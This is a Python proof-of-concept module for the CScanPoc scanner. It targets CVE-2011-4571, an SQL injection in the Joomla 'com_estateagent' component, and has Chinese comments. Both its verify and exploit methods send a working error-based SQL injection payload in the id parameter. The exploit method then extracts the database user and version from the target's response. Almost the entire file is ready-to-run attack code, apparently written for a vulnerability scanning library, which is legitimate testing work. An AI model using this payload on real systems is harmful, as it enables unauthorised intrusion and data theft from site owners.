# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0050'  # 平台漏洞编号
    # 漏洞名称
    name = 'joomla component The Estate Agent (com_estateagent) SQL injection Vulnerability'
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-08-22'  # 漏洞公布时间
    desc = '''
        joomla component The Estate Agent对参数id过滤不严，导致出现SQL注入漏洞。
        远程攻击者可以利用回显报错等方式，执行SQL指令，获取敏感信息。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-72776'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2011-4571'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cf46f93f-9df5-4c01-8907-2de7c07db0c7'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 访问的地址
            exploit = '/index.php?option=com_estateagent&act=cat&task=showCE&id='
            # 利用Union方式读取信息
            payload = "1  AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(0x247e7e7e24,"\
                "user(),0x2a2a2a,version(),0x247e7e7e24,FLOOR(RAND(0)*2))x FROM "\
                "INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- -"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 提取信息的正则表达式
            parttern = '\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=80)
            # 检查是否含有特征字符串
            if '$~~~$' in resp.text:
                # 提取信息
                match = re.search(parttern, resp.text, re.M | re.I)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 访问的地址
            exploit = '/index.php?option=com_estateagent&act=cat&task=showCE&id='
            # 利用Union方式读取信息
            payload = "1  AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(0x247e7e7e24,"\
                "user(),0x2a2a2a,version(),0x247e7e7e24,FLOOR(RAND(0)*2))x FROM "\
                "INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- -"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 提取信息的正则表达式
            parttern = '\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=80)
            # 检查是否含有特征字符串
            if '$~~~$' in resp.text:
                # 提取信息
                match = re.search(parttern, resp.text, re.M | re.I)
                if match:
                    dbusername = match.group(1)
                    dbversion = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库用户为{dbusername} 数据库版本为{dbversion}'.format(
                        target=self.target, name=self.vuln.name, dbusername=dbusername, dbversion=dbversion))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
